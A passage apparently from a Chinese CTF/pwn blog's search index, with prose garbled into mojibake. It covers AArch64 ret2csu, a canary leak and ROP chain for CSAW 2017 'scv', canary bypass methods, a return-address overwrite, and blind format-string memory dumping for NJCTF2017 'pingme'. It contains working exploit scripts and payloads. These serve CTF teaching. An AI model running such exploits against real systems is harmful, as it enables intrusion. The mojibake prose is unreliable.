      â‘ \n```\n\nå³é€šè¿‡â‘ æ¥ä¸ºR4-R10èµ‹å€¼ï¼Œä»¥åŠæ§åˆ¶PCè·³è½¬åˆ°â‘¡ï¼Œå†åˆ©ç”¨R5åœ°å€å¯¹åº”çš„å€¼æ¥èµ‹å€¼ç»™R3å¯¹åº”è·³è½¬ï¼ŒæœŸé—´ä¹Ÿå¯é€šè¿‡R7-R8æ¥æ§åˆ¶R0-R2çš„å‚æ•°ã€‚è¿™é‡Œéœ€è¦æ»¡è¶³R5å¤„ä¿å­˜çš„æ˜¯gotè¡¨åœ°å€ï¼Œå³å°†R5èµ‹å€¼ä¸ºfunc_got_addrå³å¯ã€‚\n\n \n\nå››ã€aarch64æ¶æ„çš„å‡½æ•°åˆ†ç±»ï¼šå…¶å®å°±æ˜¯ARMçš„64ä½ç‰ˆæœ¬ï¼Œé™¤äº†å¯„å­˜å™¨æ–¹é¢å˜åŒ–æŒºå¤§ï¼Œå…¶ä»–çš„è°ƒç”¨æ–¹å¼ä»€ä¹ˆçš„ä¹Ÿå·®ä¸äº†å¤ªå¤šã€‚\n\n1.å¶å­å‡½æ•°ï¼šä¸åšä»»ä½•å…¶ä»–å‡½æ•°è°ƒç”¨çš„å‡½æ•°\n\nè°ƒç”¨æ—¶çš„æ ˆçŠ¶æ€åˆ†æï¼šå’Œæ­£å¸¸çš„armå·®ä¸å¤šï¼ŒFPå…¥æ ˆï¼Œsub spå¼€è¾Ÿæ ˆç©ºé—´ã€‚æœ€åé€šè¿‡Add sp,sp,#20å’Œretæ¥è¿”å›ã€‚Retç›¸å½“äºmov PC,LRã€‚å°†LRä¸­ä¿å­˜çš„åœ°å€ç»™PCæ¥æ‰§è¡Œã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438918.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438088.png)\n\nä¹ŸåŒæ ·é€šè¿‡æ ˆåŠ«æŒæ¥æ§åˆ¶ã€‚\n\n2.éå¶å­å‡½æ•°ï¼šä¹Ÿå·®ä¸å¤šï¼Œä½†æœ‰äº›ä¸åŒçš„æ˜¯ï¼Œè¿›å…¥å‡½æ•°åï¼Œä¼šå…ˆå¼€è¾Ÿæ ˆç©ºé—´ï¼Œå…ˆå‹å…¥LRç„¶åå‹å…¥FPã€‚stp  x29, x30, [sp, #-0x30]!å³éå¶å­å‡½æ•°æ ˆä¸­çš„FPå’ŒLRéƒ½ä¿å­˜åœ¨æ ˆé¡¶ï¼Œæœ€åé€šè¿‡LDP X29, X30, [SP+0x30+var_30]åŠ ä¸ŠRETæ¥è¿”å›ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191438694.png)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439144.png)\n\nå¯ä»¥çœ‹åˆ°è¿›å…¥éå¶å­å‡½æ•°ä¸­ä¹‹åï¼Œå…ˆå¼€è¾Ÿæ ˆç©ºé—´ï¼Œç„¶åå‹å…¥LRï¼Œå†å‹å…¥FPï¼Œæ ˆæ¨¡å‹å¦‚ä¸‹ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n+-------------+\n| Last FP     | <- SP\n+-------------+\n| LR          |\n+-------------+\n|             |\n|  padding    |\n+-------------+\n|Last Last FP | <- frame pointer\n+-------------+\n|Last LR      | <- return address\n+-------------+\n|binsh_addr   |\n+-------------+\n|junk_data    |\n+-------------+\n|system_addr  |\n+-------------+\n```\n\npaddintä»¥ä¸‹çš„éƒ¨åˆ†æ‰æ˜¯æˆ‘ä»¬è¦åŠ«æŒçš„ã€‚\n\næ‰€ä»¥æˆ‘ä»¬åœ¨è¯¥å‡½æ•°ä¸­çš„æ ˆæº¢å‡ºåŠ«æŒçš„å…¶å®ä¸æ˜¯è¯¥å‡½æ•°çš„è¿”å›åœ°å€ï¼Œè€Œæ˜¯ä¸Šä¸€ä¸ªå‡½æ•°çš„è¿”å›ï¼Œæ‰€ä»¥è¿™é‡ŒåŒæ—¶ä¹Ÿéœ€è¦ç¡®ä¿ä¸Šä¸€ä¸ªå‡½æ•°ä¸­æ±‡ç¼–ä»£ç å‰©ä¸‹çš„æ“ä½œä¸ä¼šå¯¹æˆ‘ä»¬è¦†ç›–çš„æ ˆä¸Šçš„å€¼è¿›è¡Œé‡è¦æ”¹å†™ï¼Œä¸ç„¶æ ˆä¸Šçš„æ•°æ®å°±å®¹æ˜“è¢«ç ´åã€‚\n\nå…¶æ¬¡éœ€è¦æ³¨æ„çš„æ˜¯aarch64ä¸‹çš„gadgetæœç´¢ï¼Œç”¨åˆ°ï¼š\n\nROPgadget --binary ./pwn --only \"ldp|ret\"\n\nå…¶å®æ˜¯ä¸€æ ·çš„ï¼Œldpå°±ç±»ä¼¼popï¼Œåæ­£gadgetè¿ç”¨ç®—æ˜¯æ›´åŠ çµæ´»äº†ã€‚\n\nâ–²é€šå¸¸ä¹Ÿå¯ä»¥ç”¨ret2csuæ¥æå®šï¼š\n\n```\n#æ³¨é‡Šå¤´\n\n.text:00000000004008AC             LDR             X3, [X21,X19,LSL#3]     â‘¡\n.text:00000000004008B0             MOV             X2, X22\n.text:00000000004008B4             MOV             X1, X23\n.text:00000000004008B8             MOV             W0, W24\n.text:00000000004008BC             ADD             X19, X19, #1\n.text:00000000004008C0             BLR             X3                      â‘¢\n.text:00000000004008C4             CMP             X19, X20\n.text:00000000004008C8             B.NE            loc_4008AC\n.text:00000000004008CC\n.text:00000000004008CC loc_4008CC   \n.text:00000000004008CC             LDP             X19, X20, [SP,#var_s10] â‘ \n.text:00000000004008D0             LDP             X21, X22, [SP,#var_s20]\n.text:00000000004008D4             LDP             X23, X24, [SP,#var_s30]\n.text:00000000004008D8             LDP             X29, X30, [SP+var_s0],#0x40\n.text:00000000004008DC             RET\n```\n\nâ–²ä¾‹å¦‚è¯¥SPå³ä¸º0x40007ffe40ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439928.png)\n\nä¸€ç›´åˆ°0x40007ffe90ä¸ºFPï¼Œé‚£ä¹ˆå¦‚ä¸‹\n\n```\n#æ³¨é‡Šå¤´\n\n0x616161â€¦         <-FP\n0x4008cc          <-LR\n```\n\nè·³è½¬0x4008CC(u_gadget1)ä¹‹åï¼ŒSPä¸º0x40007ffea0ä¾æ¬¡èµ‹å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439548.png)\n\nå†é€šè¿‡LDP  X29, X30, [SP+var_s0],#0x40å’Œretè·³è½¬åˆ°0x4008ac(u_gadget2)æœ€ç»ˆå®ç°X0~X3èµ‹å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191439293.png)\n\næœ€ç»ˆè·³è½¬å‡½æ•°çœŸå®åœ°å€0x400090f9c8ï¼Œå³éœ€è¦ç»™X21èµ‹å€¼ä¸ºread_got_addrï¼Œå‚æ•°ä¾æ¬¡ä¸ºread(0,0x411010,0x8)ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨readå®Œæˆä¹‹åï¼Œè¿˜æ˜¯ä¼šå›åˆ°å½“å‰çš„ä¸‡èƒ½gadgetå¤„0x4008C4ï¼Œå†æ¥ç€è¿è¡Œä¸‹å»ã€‚ç„¶åä¸€è·¯è¿è¡Œä¸‹å»ï¼Œç»è¿‡ä¸‡èƒ½gadgetä¸­çš„RETè¿”å›åˆ°ä¹‹å‰è®¾ç½®çš„0x40007ffee8å¤„ä¹Ÿå°±æ˜¯0x400824ï¼Œè¿™ä¸ªä¹Ÿæ˜¯åœ¨æœ€å¼€å§‹å°±è®¾ç½®å¥½çš„ï¼Œé€šå¸¸å¯ä»¥ç”¨æ¥è¿”å›åˆ°readå‡½æ•°æˆ–è€…mainå‡½æ•°å¤„å†æ‰§è¡Œæ ˆæº¢å‡ºï¼Œä¹‹åå°±æ­£å¸¸æ“æ§ç¨‹åºã€‚\n\nâ–²è„šæœ¬ç¤ºä¾‹ï¼š\n\n```python\ndef aarch64_csu(call, x0, x1, x2,ret_addr):\n    payload = p64(u_gadget1)\n    payload += \"A\"*0x8\n    payload += p64(u_gadget2)\n    payload += p64(0x0)\n    payload += p64(0x1)\n    payload += p64(call)          #got_addr\n    payload += p64(x2)\n    payload += p64(x1)\n    payload += p64(x0)\n    payload += \"B\"*0x8\n    payload += p64(ret_addr)\n    return payload\n\npayload = flat(cyclic(72)\npayload += aarch64_csu(elf.got['read'], 0, bss_addr, 8,ret_addr))\n```\n\nè¿™ä¸ªæ˜¯æ²¡æœ‰æ ˆåŠ«æŒçš„ã€‚Aarch64çš„csuä¹Ÿä¸æ€ä¹ˆç”¨åˆ°ï¼Œå› ä¸ºaarch64çš„csuèµ‹å€¼ä¸æ˜¯popï¼ŒSPåŸºæœ¬ä¸ä¼šåŠ¨ï¼Œè€Œä¸”å¤§å¤šæ—¶å€™éƒ½æ˜¯SPå¯»å€ã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://www.anquanke.com/post/id/199112#h3-23\n","tags":["ARM-Knowledge"],"categories":["ARM"]},{"title":"CSAW Quals CTF 2017-scv","url":"/2021/08/19/CSAW Quals CTF 2017-scv/","content":"\n1.å¸¸è§„checksecï¼Œå¼€å¯äº†NXå’ŒCanaryã€‚æ‰“å¼€IDAå‘ç°ç¨‹åºä¸¤ä¸ªæ¼æ´ï¼š\n\n(1)åŠŸèƒ½1ä¸­æ ˆæº¢å‡ºï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nchar buf; // [rsp+10h] [rbp-B0h]\n--------------------------------------\nv25 = read(0, &buf, 0xF8uLL);\n```\n\n(2)åŠŸèƒ½2ä¸­è¾“å‡ºå­—ç¬¦ä¸²ï¼šputs(&buf);\n\næ³¨ï¼šè¿™é‡Œçš„putå’Œprintfä¸æ˜¯åŒä¸€ä¸ªæ¦‚å¿µï¼Œä¸æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‡½æ•°ã€‚ä½†æ˜¯ç”±äºputæ˜¯ç›´æ¥è¾“å‡ºæˆ‘ä»¬çš„è¾“å…¥ï¼Œè€Œæˆ‘ä»¬çš„è¾“å…¥è¢«ä¿å­˜åœ¨mainå‡½æ•°æ ˆä¸Šï¼Œæ‰€ä»¥å¯ä»¥è¾“å…¥è¶³å¤Ÿå¤šçš„æ•°æ®è¿ä¸Šcanaryï¼Œåˆ©ç”¨putä¸€å¹¶æ‰“å°å‡ºæ¥ï¼Œä»è€ŒæŠŠcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n2.è°ƒè¯•ï¼ŒIDAä¸­è§‚å¯Ÿä½ç½®ï¼Œè®¡ç®—åç§»ï¼Œå¯ä»¥çŸ¥é“åç§»ä¸º0xB0-0x8=0xA8=168ä¸ªå­—ç¬¦ï¼Œ(canaryé€šå¸¸è¢«æ”¾åœ¨rbp-0x08çš„ä½ç½®å¤„ï¼Œå½“ç„¶ä¹Ÿä¸ä¸€å®šï¼Œæœ€å¥½è¿˜æ˜¯è°ƒè¯•ä¸€ä¸‹)è¿™æ ·å°±å¯ä»¥æ„é€ ç¬¬ä¸€ä¸ªpayload:payload1 = â€Aâ€*168 + â€œBâ€ã€‚\n\nè¿™é‡Œå†åŠ ä¸€ä¸ªBæ˜¯å› ä¸ºcanaryçš„ä¿æŠ¤æœºåˆ¶ï¼Œä¸€èˆ¬æƒ…å†µä¸‹canaryçš„æœ€åä¸¤ä½ä¹Ÿå°±æ˜¯æœ€åä¸€ä¸ªå­—ç¬¦éƒ½æ˜¯\\x00ï¼Œç”±äºæ˜¯å¤§ç«¯åºï¼Œæ‰€ä»¥å¯ä»¥é˜²æ­¢ä¸å°å¿ƒæŠŠcanaryæ³„éœ²å‡ºæ¥ã€‚å› ä¸ºä¸Šä¸€ä¸ªæ ˆå†…å­˜çš„æœ€åç¬¬ä¸€ä¸ªå­—ç¬¦è¿æ¥çš„æ˜¯ä¸‹ä¸€ä¸ªæ ˆå†…å­˜çš„ç¬¬ä¸€ä¸ªå­—ç¬¦ï¼Œä¹Ÿå°±æ˜¯canaryä¸­çš„\\x00ï¼Œè€Œæ‰“å°å‡½æ•°é»˜è®¤00æ˜¯å­—ç¬¦ä¸²çš„ç»“å°¾ï¼Œæ‰€ä»¥è¿™é‡Œå¦‚æœè¾“å…¥â€Aâ€*168ï¼Œé‚£ä¹ˆæ‰“å°å‡ºæ¥çš„å°±åªä¼šæ˜¯168ä¸ªAï¼Œä¸ä¼šå°†canaryå¸¦å‡ºæ¥ã€‚æ‰€ä»¥æˆ‘ä»¬å†åŠ ä¸€ä¸ªBï¼Œè¦†ç›–æ‰canaryåœ¨å å†…å­˜çš„ç¬¬ä¸€ä¸ªå­—ç¬¦00ï¼Œä»è€Œèƒ½å¤Ÿè¿æ¥ä¸Šæˆä¸ºä¸€ä¸ªå®Œæ•´çš„å­—ç¬¦ä¸²æ‰“å°å‡ºæ¥ã€‚ä½†åˆç”±äºæ˜¯å¤§ç«¯åºï¼Œæ³„éœ²å‡ºæ¥çš„canaryåº”è¯¥æœ€åä¸€ä¸ªå­—ç¬¦æ˜¯Bï¼Œå¯¹åº”\\x42ï¼Œè¿™é‡Œéœ€è¦ä¿®æ”¹æˆ\\x00ä»è€Œè·å¾—æ­£ç¡®çš„canaryã€‚åŒç†ï¼Œå¦‚æœéšæœºåŒ–çš„canaryä¸­å«æœ‰\\x00ï¼Œé‚£ä¹ˆä»ç„¶ä¼šå¯¼è‡´å­—ç¬¦ä¸²æˆªæ–­ï¼Œæ— æ³•å¾—åˆ°æ­£ç¡®çš„canaryã€‚æ‰€ä»¥å…¶å®å¦‚æœå¤šæ‰§è¡Œå‡ æ¬¡ï¼Œç¢°åˆ°åŒ…å«\\x00çš„canaryï¼Œå°±ä¼šå¯¼è‡´ç¨‹åºå‡ºé”™ã€‚\n\næ³„éœ²åŠ ä¿®æ”¹ï¼šcanary = u64('\\x00'+io.recv(7))\n\n3.ä¹‹åå°±å¯ä»¥åˆ©ç”¨canaryçš„å€¼å’Œæ ˆæº¢å‡ºï¼Œè°ƒç”¨putå‡½æ•°æ‰“å°å…¶å®ƒå‡½æ•°çš„å®é™…åœ°å€ã€‚è¿™é‡Œç¨‹åºä½¿ç”¨äº†readå‡½æ•°ï¼Œå¹¶ä¸”åŒæ—¶å¤–éƒ¨è°ƒç”¨äº†readå‡½æ•°ï¼Œå¯ä»¥é€šè¿‡è¾“å…¥readçš„.gotè¡¨çš„å€¼ï¼Œä½¿å…¶æ‰“å°readå‡½æ•°çš„çœŸå®åœ°å€ã€‚åŒæ—¶éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äºæ˜¯64ä½ç¨‹åºï¼Œä¼ å‚æ˜¯ä»rdiå¼€å§‹ï¼Œæ‰€ä»¥æ ˆæº¢å‡ºçš„ç¬¬ä¸€ä¸ªè¿”å›åœ°å€åº”è¯¥ç»™rdièµ‹å€¼æ‰å¯¹ï¼Œç¼–å†™payload1ã€‚\n\n```\n#æ³¨é‡Šå¤´\n\npayload1 = \"\"\npayload1 += \"A\"*168 #padding\npayload1 += p64(canary) #åœ¨canaryåº”è¯¥åœ¨çš„ä½ç½®ä¸Šå†™canary\npayload1 += \"B\"*8 #è¿™ä¸€æ®µå®é™…ä¸Šæ˜¯rbpçš„ä½ç½®\npayload1 += p64(pop_rdi)   \n#è·³è½¬åˆ°pop rdi;retn;æ‰€åœ¨è¯­å¥(å¯ä»¥é€šè¿‡ROPgadgetæŸ¥è¯¢)ï¼Œæ¥ç»™rdiä¼ å…¥readå‡½æ•°çš„gotè¡¨ä¸­çš„åœ°å€ã€‚\npayload1 += p64(read_got) #è¢«pop rdiè¯­å¥è°ƒç”¨ï¼Œå‡ºæ ˆ\npayload1 += p64(puts_plt)\n#retnåˆ°putå‡½æ•°çš„pltè¡¨ï¼Œè°ƒç”¨putå‡½æ•°ã€‚\npayload1 += p64(start)\n#è°ƒç”¨ä¹‹åï¼Œè¿”å›ç¨‹åºæœ€å¼€å§‹ï¼Œæ¢å¤æ ˆå¸§ï¼Œå†æ‰§è¡Œä¸€éç¨‹åº\n```\n\nè¿™æ ·å°±å¯ä»¥å¾—åˆ°readçš„å®é™…åœ°å€ï¼Œä»è€Œé€šè¿‡libcåº“è®¡ç®—åç§»åœ°å€å¾—åˆ°åŸºåœ°å€ã€‚\n\n5.ç°åœ¨æœ‰äº†libcåº“çš„åŸºåœ°å€ï¼Œè§‚å¯Ÿmainå‡½æ•°é€€å‡ºæ—¶çš„æ±‡ç¼–ä»£ç ï¼šmov   eax, 0å¯ä»¥ä½¿ç”¨åœ¨2.24libcåº“æ¡ä»¶ä¸‹å¯ä»¥ä½¿ç”¨onegadgetã€‚\n\n6.ç›´æ¥è®¡ç®—onegadgetåç§»ï¼Œç„¶åè¦†ç›–mainå‡½æ•°çš„è¿”å›åœ°å€ï¼Œgetshellã€‚\n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["canary"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"Canaryç»•è¿‡æ€»ç»“","url":"/2021/08/19/Canaryç»•è¿‡æ€»ç»“/","content":"\n1.æœ‰å¾ªç¯æ—¶ï¼Œ32æˆ–è€…64ä½ç¨‹åºä¸‹éƒ½å¯ä»¥é€å­—èŠ‚çˆ†ç ´ç»•è¿‡ã€‚\n\n2.å¯é€šè¿‡printfå­—ç¬¦ä¸²æ¼æ´æ¥æ³„éœ²(%p.%p.%p....)ã€‚\n\n3.é€šè¿‡æ‰“å°æ ˆä¸Šæ•°æ®çš„æ‰“å°å‡½æ•°æ ˆæº¢å‡ºè¿ä¸Šcanaryæ³„éœ²å‡ºæ¥ã€‚\n\n4.å½“ç¨‹åºç›´æ¥è¯»å–flagè¿›å…¥å†…å­˜æ—¶ï¼Œåˆ©ç”¨å‡½æ•°__stack_chk_failï¼ŒåŠ ä¸Šè¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºè¦†ç›–argv[0]ä¸ºç¨‹åºä¸­ä¿å­˜flagçš„åœ°å€ã€‚è¿™æ ·å½“__stack_chk_failè¿è¡Œæ—¶å°±ä¼šæ‰“å°å‡ºargv[0]ä¸­åœ°å€ä¸Šå¯¹åº”çš„å†…å®¹ï¼Œä¹Ÿå°±æ˜¯flagã€‚æœ‰æ—¶å€™éœ€è¦è®¾ç½®è¿œç¨‹ç¯å¢ƒå˜é‡LIBC_FATAL_STDERR_=1ï¼Œå°†flagæ‰“å°åœ¨æœ¬åœ°ã€‚\n\n5.ç”±pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°ä¸­å¦‚æœæœ‰è¶³å¤Ÿé•¿åº¦çš„æ ˆæº¢å‡ºï¼Œå¯ä»¥ç›´æ¥è¦†ç›–canaryæ¥æºtcbhead_tç»“æ„ä½“ä¸­çš„canaryå’Œæ ˆä¸­çš„canaryä¸ºåŒä¸€æ•°å€¼ï¼Œè¿™æ ·æ£€æŸ¥ä»æ—§é€šè¿‡ã€‚\n\n(64ä½ä¸­ä¸ºfs:[28h]ï¼Œ32ä½ä¸­ä¸ºgs:[14h])\n\nâ–²æŸ¥æ‰¾æ–¹æ³•ï¼š\n\n(1)pwndbg>catch syscall 158\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520600.jpeg)\n\n(2)æŸ¥çœ‹rsiå¯„å­˜å™¨ï¼Œé‡Œé¢å­˜çš„å†…å®¹å°±æ˜¯tcbhead_tç»“æ„ä½“çš„é¦–åœ°å€ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520328.jpeg)\n\n(3)ä¹‹åå°±å¯ä»¥æŸ¥çœ‹canaryçš„å€¼ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520551.jpeg)\n\nä½†æ˜¯è¿™ä¸ªæ–¹æ³•å¥½åƒä¸æ€ä¹ˆé¡¶ç”¨äº†ï¼Œlibc2.23åŠä»¥ä¸‹éƒ½è¡Œï¼Œä½†æ˜¯libc2.27å°±ä¼šå‡ºç°æ— æ³•è®¿é—®çš„é”™è¯¯ï¼Œå…·ä½“çš„åŸå› å¥½åƒæ˜¯libcå‡çº§ä¹‹åæ·»åŠ äº†ä»€ä¹ˆä¸œè¥¿è®¾ç½®äº†ä¸å¯è®¿é—®ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520546.jpeg)\n\n32ä½ä¸‹æ²¡æœ‰arch_prctlè¿™ä¸ªç³»ç»Ÿè°ƒç”¨äº†ï¼Œéœ€è¦çœ‹canaryçš„ç”Ÿæˆå‡½æ•°è°ƒç”¨äº†ä»€ä¹ˆç³»ç»Ÿè°ƒç”¨ï¼Œæ–¹æ³•ç±»ä¼¼ï¼Œä¸‹æ–­ç‚¹ä¹‹åæŸ¥å‡ºæ¥ã€‚\n\nâ˜…IDAä¸­è¿œç¨‹è°ƒè¯•ä¹Ÿå¯ä»¥æŸ¥å‡ºæ¥ï¼Œåˆ©ç”¨ç¨‹åºå¼€å¤´çš„fs:28ï¼Œæ‰¾åˆ°åœ°å€ï¼Œç„¶åå‡å»libcåŸºåœ°å€å°±å¯ä»¥å¾—åˆ°åç§»ã€‚ä½†æ˜¯éœ€è¦libcä¸€è‡´ï¼Œåç§»æ‰ä¼šä¸€è‡´ã€‚è€Œä¸”è¿™ä¸ªåç§»å¹¶ä¸æ˜¯åœ¨libcæ•°æ®æ®µä¸Šï¼Œåªæ˜¯ç¨‹åºåˆå§‹åŒ–æ—¶æ”¾åœ¨åé¢çš„ï¼Œæ‰€ä»¥ä¸åŒçš„ç¨‹åºä¸åŒçš„libcéƒ½ä¼šå¯¼è‡´åç§»ä¸ä¸€æ ·ï¼Œéœ€è¦å…·ä½“è°ƒè¯•ã€‚\n\nâ–²é•¿åº¦ä¸€èˆ¬ä¸ºrbp+2000å·¦å³ï¼Œä¸åŒçš„Libcç‰ˆæœ¬éƒ½ä¸å¤ªä¸€æ ·ï¼Œéœ€è¦è°ƒè¯•æ‰èƒ½çŸ¥é“ã€‚åŸå› æ˜¯é€šè¿‡pthreadå‡ºæ¥çš„çº¿ç¨‹å‡½æ•°æ ˆä¼šè¢«å®‰ç½®åˆ°ä¸TLSç›¸å·®çº¦2000å­—èŠ‚çš„è·ç¦»å¤„ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520195.png)    ![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191520726.png)\n\nè¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œç¬¬ä¸€ä¸ªæ˜¯mainå‡½æ•°æ ˆï¼Œç¬¬äºŒä¸ªæ˜¯åœ¨mainå‡½æ•°ä¸­é€šè¿‡pthreadè¿›ç¨‹åˆ›å»ºå¹¶ä¸”è°ƒç”¨çš„å‡½æ•°æ ˆï¼Œä¸¤è€…ç›¸å·®å°†è¿‘0x700000000è¿™ä¹ˆè¿œï¼Œå®Œå…¨ä¸æ˜¯æ­£å¸¸çš„å‡½æ•°è°ƒç”¨ç›¸å·®çš„æ ˆè·ç¦»ã€‚åŒæ—¶åœ¨è¯¥å‡½æ•°ä¸­rbpæŒ‡å‘çš„å§‹ç»ˆæ˜¯0000(å…¨æ˜¯)ï¼Œè¯¥å‡½æ•°ç»“æŸåä¼šå…ˆè·³è½¬åˆ°libcä¸­çš„libpthreadæ¥æ¢å¤æ ˆã€‚\n\n```\n#æ³¨é‡Šå¤´\n\nâ–²64ä½çš„tcbhead_tç»“æ„ä½“ï¼š\ntypedef struct\n{\n  void *tcb;        /* Pointer to the TCB.  Not necessarily the\n               thread descriptor used by libpthread.  */\n  dtv_t *dtv;\n  void *self;       /* Pointer to the thread descriptor.  */\n  int multiple_threads;\n  int gscope_flag;\n  uintptr_t sysinfo;\n  uintptr_t stack_guard;//å³ä¸ºcanaryï¼Œfs:28hå¤„\n  uintptr_t pointer_guard;\n  ...\n} tcbhead_t;\n```\n\n \n\n \n","tags":["pwn-Knowledge"],"categories":["PWN","canaryç»•è¿‡0x9"]},{"title":"Hello_World","url":"/2021/08/19/Hello_World/","content":"\n1.å¾ˆç®€å•çš„ä¸€ä¸ªç¨‹åºï¼ŒIDAæ‰“å¼€ï¼Œ32ä½ç¨‹åºï¼Œmainå‡½æ•°-helloå‡½æ•°ä¸­\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556311.jpeg)\n\n```\n#æ³¨é‡Šå¤´\n\nint buf; // [esp+6h] [ebp-12h]\nread(0, &buf, 0x64u);\n```\n\nbufè·ç¦»æ ˆåº•æœ‰0x12hï¼Œè€Œå¯ä»¥è¯»å…¥çš„æ•°æ®æœ‰0x64hï¼Œæ‰€ä»¥å¯ä»¥æ ˆæº¢å‡ºã€‚\n\n2.checksecä¸€ä¸‹ï¼Œå¼€äº†NXï¼Œä¸èƒ½shellcodeï¼Œè¿™é‡Œä¹Ÿä¸éœ€è¦ï¼Œå› ä¸ºæˆ‘ä»¬çš„è¾“å…¥å¹¶ä¸ä¼šè¢«å½“æˆæŒ‡ä»¤æ¥æ‰§è¡Œã€‚\n\n3.ç¨‹åºä¸­è‡ªå¸¦åé—¨getShellå‡½æ•°ï¼Œå¹¶ä¸”æœ‰æ ˆæº¢å‡ºï¼Œé‚£ä¹ˆç›´æ¥è¦†ç›–helloå‡½æ•°çš„è¿”å›åœ°å€è·³è½¬å³å¯ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556319.jpeg)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191556326.jpeg)\n\n4.ç¼–å†™payload:\n\npayload = \"a\"*(0x12+0x04)  #padding\n\n(å…¶ä¸­0x12æ˜¯è¦†ç›–æ‰è·ç¦»æ ˆåº•çš„å†…å®¹ï¼Œ0x04æ˜¯è¦†ç›–æ‰helloå‡½æ•°è¿”å›çš„ebpï¼Œä¹‹åæ‰æ˜¯è¦†ç›–helloå‡½æ•°çš„è¿”å›åœ°å€)\n\npayload += p32(0x0804846B)  ##è¦†ç›–è¿”å›åœ°å€\n\n5.ä¹‹åè¾“å…¥ï¼Œç„¶åInteractive()å³å¯ã€‚\n\n \n\n \n\nå‚è€ƒèµ„æ–™ï¼š\n\nhttps://bbs.ichunqiu.com/forum.php?mod=collection&action=view&ctid=157\n\n \n","tags":["First"],"categories":["PWN","StackOverflow0x1"]},{"title":"NJCTF2017_pingme","url":"/2021/08/19/NJCTF2017_pingme/","content":"\n1.æ­å»ºé¢˜ç›®ï¼šsocat tcp-listen:10001,fork exec:./pingme,reuseaddr &\n\n2.é¢˜ç›®ä¸ç»™æ–‡ä»¶ï¼Œåªæœ‰åœ°å€å’Œç«¯å£ï¼Œå¯èƒ½æ˜¯BROPä¹Ÿå¯èƒ½æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ã€‚è¿æ¥ä¸Šå…ˆå°è¯•æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ï¼Œè¾“å…¥å¤šä¸ª%p.%p.%pï¼Œå¯ä»¥çœ‹åˆ°æ³„éœ²å‡ºäº†æ•°æ®ï¼Œé‚£ä¹ˆå°±åº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²ç›²æ‰“ã€‚\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518475.jpeg)\n\n3.é¦–å…ˆåˆ©ç”¨çˆ†ç ´æ‰¾åˆ°æˆ‘ä»¬è¾“å…¥çš„å‚æ•°åç§»ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import*\nio = remote(\"127.0.0.1\",10001)\n#io = process(\"./pingme\")\n\ndef exec_fmt(payload):\n    io.sendline(payload)\n    info = p.recv()\n    return info\n\nauto = FmtStr(exec_fmt)\noffset = auto.offset\n```\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518534.jpeg)\n\nåç§»ä¸º7ï¼ŒéªŒè¯ä¸€ä¸‹ï¼š\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191518484.jpeg)\n\n4.åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°†äºŒè¿›åˆ¶æ–‡ä»¶dumpä¸‹æ¥ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\nfrom pwn import*\n\ndef dump_memory(start_addr,end_addr):\n    result = \"\"\n    while start_addr < end_addr:\n        io = remote('127.0.0.1',10001)\n        io.recvline()\n        payload = \"%9$s.AAA\" + p32(start_addr)\n        io.sendline(payload)\n        data = io.recvuntil(\".AAA\")[:-4]\n        if data == \"\":\n            data = \"\\x00\"\n        log.info(\"leaking: 0x%x --> %s\"%(start_addr,data.encode('hex')))\n        result += data\n        start_addr += len(data)\n        io.close()\n    return result\nstart_addr = 0x8048000\nend_addr = 0x8049000\ncode_bin = dump_memory(start_addr,end_addr)\nwith open(\"code.bin\",\"wb\") as f:\n    f.write(code_bin)\n    f.close()\n```\n\n(1)ç”±äºæ˜¯æ 